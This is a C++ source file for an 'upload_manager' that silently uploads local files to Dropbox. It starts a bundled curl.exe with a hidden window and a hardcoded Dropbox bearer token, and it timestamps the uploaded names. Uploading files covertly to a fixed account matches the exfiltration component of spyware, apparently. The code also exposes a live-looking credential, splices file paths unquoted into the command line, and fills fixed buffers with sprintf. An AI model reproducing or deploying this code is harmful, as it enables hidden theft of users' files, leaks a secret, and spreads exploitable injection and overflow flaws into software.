#include "upload_manager.h"
#pragma warning(disable : 4996)

string upload_manager::get_file_name(string src) {
    string path_string = src;
    int index = path_string.find_last_of("\\");
    if (index != path_string.npos)
        path_string = path_string.substr(index + 1, path_string.length());
    return path_string;
}



void upload_manager::start(string file_path) {

    string  file_name = get_file_name(file_path);

    time_t myt = time(NULL);

    char time_string[16];
    sprintf(time_string, "%d_", myt);
    file_name = time_string + file_name;
    string command = prepare_string(file_name, file_path);

    char curl_bin[256];
    char buff[256];
    _getcwd(buff, sizeof(buff));
    sprintf(curl_bin, "%s\\curl\\curl.exe", buff);
    SHELLEXECUTEINFO ShExecInfo = { 0 };

    ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);

    ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;

    ShExecInfo.hwnd = NULL;

    ShExecInfo.lpVerb = NULL;

    ShExecInfo.lpFile = curl_bin ;

    ShExecInfo.lpParameters = command.c_str();

    ShExecInfo.lpDirectory = NULL;

    ShExecInfo.nShow = SW_HIDE;

    ShExecInfo.hInstApp = NULL;

    ShellExecuteEx(&ShExecInfo);
    WaitForSingleObject(ShExecInfo.hProcess, INFINITE);

}

string upload_manager::prepare_string(string file_name, string file_path) {
    string res_command = " -X POST https://content.dropboxapi.com/2/files/upload "
                         "--header \"Authorization: Bearer wO-OKXR2pZAAAAAAAAAAEO5hiDcFqdWDVCGX1R7jJBKR-Gj3koTd3Xob2jkq55dV\""
                         " --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/willbereplace_1\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,"
		"\\\"mute\\\": false,\\\"strict_conflict\\\": false}\" --header \"Content-Type: application/octet-stream\" --data-binary @willbereplace_2";
		
		
		
		//" -X POST https://content.dropboxapi.com/2/files/upload "
  //                       "--header \"Authorization: Bearer wO-OKXR2pZAAAAAAAAAAEO5hiDcFqdWDVCGX1R7jJBKR-Gj3koTd3Xob2jkq55dV\""
  //                       " --header \"Dropbox - API - Arg : {\"path\": \"/willbereplace_1\",\"mode\": \"add\",\"autorename\": true,"
  //                       "\"mute\": false,\"strict_conflict\": false}\" --header \"Content-Type: application/octet-stream\" --data - binary @willbereplace_2";

    //string file_name = "2s3523zxcvxczvzxc5.exe";
    //string file_path = "E:/www.dropbox.com/developers/documentation.EXE";
    res_command = res_command.replace(res_command.find("willbereplace_1"), 15, file_name);
    res_command = res_command.replace(res_command.find("willbereplace_2"), 15, file_path);


    return res_command;
}
